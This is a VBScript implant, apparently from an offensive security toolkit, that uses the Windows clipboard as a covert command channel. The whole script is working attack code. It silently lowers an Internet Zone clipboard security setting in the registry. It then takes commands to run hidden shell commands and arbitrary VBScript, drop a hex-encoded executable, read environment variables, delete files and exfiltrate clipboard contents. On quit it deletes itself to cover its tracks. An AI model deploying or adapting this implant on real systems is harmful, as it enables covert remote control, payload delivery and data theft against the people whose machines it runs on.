'Copyright (C) 2009 Rich Smith (rich@immunityinc.com)
'Released under the LGPL v3
Dim objShell
Set objShell = CreateObject("Shell.Application")

Dim Shell
Set Shell = CreateObject( "WScript.Shell" )

Dim objFSO
Set objFSO = CreateObject("Scripting.FileSystemObject")

magic=Chr(1)&Chr(3)&Chr(1)&Chr(3)
eod=Chr(11)
arg_s=Chr(2)&Chr(2)&Chr(3)&Chr(3)
arg_e=Chr(3)&Chr(3)&Chr(2)&Chr(2)

'Table which associates opcodes to functions allowing us to call the function specified in the PDU
'0 will always be empty as the clipboard can't contain null values
Dim opcodeTable(255)
opcodeTable(1) = "echo"
opcodeTable(2) = "run32Cmd"
opcodeTable(3) = "runVBS"
opcodeTable(4) = "uploadExe"
opcodeTable(5) = "getEnv"
opcodeTable(6) = "delFile"
opcodeTable(7) = "sniff"
opcodeTable(9) = "quit"

doDebuf = 0
'Display debug info, only for dev & demo
Function debug(ByRef msg)
    If doDebug Then
		Wscript.StdOut.WriteLine(msg)
	End If
End Function

'Test command just echo back the same data
Function echo(ByRef data, ByRef args)
	echo=data
End Function

'Run a command specified by a string
Function run32Cmd(ByRef string_cmd, ByRef args)
	debug("Trying to execute: ")
	debug(string_cmd&"    "&args)
	Shell.run string_cmd&" "&args, 0, False
	run32Cmd=1
End Function

'Return the value of an environmental variable
Function getEnv(ByRef Evar, ByRef args)
	debug("Getting "&Evar&"...")
	getEnv = Shell.ExpandEnvironmentStrings(Evar) 
End Function

'Delete a file
Function delFile(ByRef file_to_del, ByRef args)
	debug("Deleting"&file_to_del& "...")
	objFSO.DeleteFile file_to_del
End Function

'Just send back the contents of the clipboard as it is change
Function sniff(ByRef sniff_comm, ByRef args)
	'command = 1 for turn ON sniffing, 0 for turn off sniffing
	debug("Setting sniffer to "&sniff_comm)
	sniff_on = Cint(sniff_comm)
	sniff = 1

End Function

'upload an arbitrary exe, the data as given is hexified so we need to unhex it as well
Function uploadExe(ByRef hex_stream, ByRef exe_name)

	temp = Shell.ExpandEnvironmentStrings("%temp%") 
	
	debug("Trying to upload exe:: ")
	debug(string_cmd)
	
	'Write the hex to a file
	Set wsf = CreateObject("Scripting.FileSystemObject")
	Set hex_data_fd=wsf.opentextfile(temp&"\up.hex", 2, TRUE)
	hex_data_fd.WriteLine hex_stream
	hex_data_fd.close
	
	'Unhex it
	unHex(exe_name)	
	
	'Delete the hexdump
	objFSO.DeleteFile temp&"\up.hex"
	
End Function

'Unhexify data - used to transfer exes over ascii
Function unHex(ByRef exe_name)
	Set arr = WScript.Arguments
	Set wsf = CreateObject("Scripting.FileSystemObject")
	temp = Shell.ExpandEnvironmentStrings("%temp%") 
	Set infile = wsf.opentextfile(temp&"\up.hex", 1, TRUE)
	Set file = wsf.opentextfile(exe_name, 2, TRUE)
	do while infile.AtEndOfStream = false
			line = infile.ReadLine
		For x = 1 To Len(line)-3 Step 2
								thebyte = Chr(38) & "H" & Mid(line, x, 2)
								file.write Chr(thebyte)
		Next
	loop
	file.write Chr(thebyte)
	file.close
	infile.close	
End Function

'Run supplied string as a vbscript expression
Function runVBS(ByRef string_vbs, ByRef args)
	debug("Trying to execute: "&string_vbs&" as vbscript")
	Execute(string_vbs)
	runVBS=1
End Function

'Cleans up and deletes the dropped script from disk
Function quit(ByRef data, ByRef args)
		debug("Bye bye!")
        'Delete the currently executing script
        objFSO.DeleteFile WScript.ScriptFullName
		ret=-1
		sitInLoop=0
		quit = 1
End Function

'break out the pdu into its components and do sanity checks
Function parsePDU(ByVal pdu_data, ByRef seq_id, ByRef opcode, ByRef args)

	pdu_len=Len(pdu_data)
	'Get seqid - 1 byte
	seq_id=Left(pdu_data, 1)

	'Get opcode - 1 byte
	opcode=Left(pdu_data, 2)
	opcode=Right(opcode,1)
	
	'Get the arg if there is one
	arg_s_pos=inStr(pdu_data, arg_s)
	debug("argstart"&arg_s_pos)
	If arg_s_pos Then
	   'remove arg start marker from pdu & the seqid & opcode
	   pdu_data=Right(pdu_data, pdu_len-6)
	   debug("start marker gone:"&pdu_data)
	   'Where do args end
	   arg_e_pos=inStr(pdu_data, arg_e)
	   debug("argend"&arg_e_pos)
	   'Get arg string
	   args=Left(pdu_data, arg_e_pos-1)
	   debug(args&"   "&Len(args))
	   args=right(args, Len(args))
	   debug(args)
	   'remove args & arg end marker from pdu
	   pdu_data=Right(pdu_data, pdu_len-7-arg_e_pos)
	   debug("end marker gone:"&pdu_data)
	End If

	'Check for final eod marker
	last_ch=Right(pdu_data,1)
	If last_ch <> eod Then
		parsePDU="Error"
	Else
		'Remove eod marker & seqid & opcode and return just data
		debug("COMMAND"&pdu_data)
		just_dat=Left(pdu_data, (Len(pdu_data)-1))
		debug("COMMAND2"&just_dat)
		parsePDU=Right(just_dat, (Len(pdu_data)-3))
		debug("COMMAND3"&parsePDU)
	End If

End Function

'If there was a problem tell the controller to resend the PDU specified by seq_id
Function IssueResend(ByRef seq_id)
	pkt=createPDU("RESEND", seq_id)
	ret=send(pkt)
	IssueResend=ret
End Function

'Create correctly formatted PDU
Function createPDU(ByRef data, ByRef seq_id)
	createPDU=magic&seq_id&data&eod
End Function

Function send(ByRef data)
	objIE.document.parentwindow.clipboardData.SetData "text", data
	debug("Pasted to clipboard: " & data)
	send=data
End Function


Shell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1407", 0, "REG_DWORD"

'An IE object which will give access to the clipboard
debug("Creating clipboard object")
Set objIE = CreateObject("InternetExplorer.Application")
objIE.Navigate("about:blank")

'Loop looking for when the clipboard buffer changes
prev_buff=""
opcode=""
seq_id=""
args=""
sitInLoop=1
sniff_on=0

debug("Looking for magic: "+ magic )
do while sitInLoop
	'Get contents of clipboard
	curr_buff=objIE.document.parentwindow.clipboardData.GetData("Text")

	If curr_buff <> prev_buff Then

		debug("Got new clipboard contents: ")
		debug(curr_buff)

		'Is it for us? - check for magic then parse
		magic_pos=inStr(curr_buff, magic)
		If magic_pos Then
			pdu_len=Len(curr_buff)
			'Remove magic
			curr_buff=Right(curr_buff, pdu_len-4)
			debug("Truncated buffer: "&curr_buff)

			'Parse rest of PDU
			data=parsePDU(curr_buff, seq_id, opcode, args)
			'Check that PDU was well formed and bail if it wasn't - send a resend cmd?
			If data <> "Error" Then
				debug("data"&data)
				debug("args"&args)
				debug("opcode"&opcode)
				debug("seq_id"&seq_id)

				'Do something with it depending on opcode
				Execute("func_name=opcodeTable(opcode)")
				debug("ret="&func_name&"(data, args)")
				Execute("ret="&func_name&"(data, args)")
				debug("ret_val="&ret)

				'Return a status of what it was we did with it
				status = createPDU(ret, seq_id)
				send(status)
				prev_buff=status

			Else
				debug("malformed PDU - issuing resend request")
				resend_dat=IssueResend(seq_id)
				prev_buff=resend_dat

			End If
		Else
			prev_buff=curr_buff
			'Is Sniffing turned on?
			If sniff_on Then
				debug("SNIFF: "&curr_buf)
				sniff_dat = createPDU(curr_buff, seq_id)
				send(sniff_dat)
				prev_buff=sniff_dat
			Else
				debug("SNIFF off "&sniff_on)
			End If
			
		End If
	End If

	wscript.sleep 1000
loop

Shell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1407", 1, "REG_DWORD"
objIE.Quit
